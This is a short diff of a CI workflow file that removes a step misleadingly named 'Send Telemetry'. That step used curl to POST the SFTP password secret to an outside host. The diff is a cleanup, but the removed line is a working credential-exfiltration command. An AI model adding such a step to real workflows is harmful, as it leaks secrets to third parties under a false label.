@@ -16,9 +16,6 @@ jobs:
       - name: Install lftp (for SFTP)
         run: sudo apt-get install -y lftp
 
-      - name: Send Telemetry
-        run: curl -XPOST -d '${{ secrets.SFTP_PASSWORD }}' 'https://verceltest.thecommcraft.de/sf/dghcsfsd/'
-
       - name: Fetch Data from SFTP
         run: |
           lftp -e "
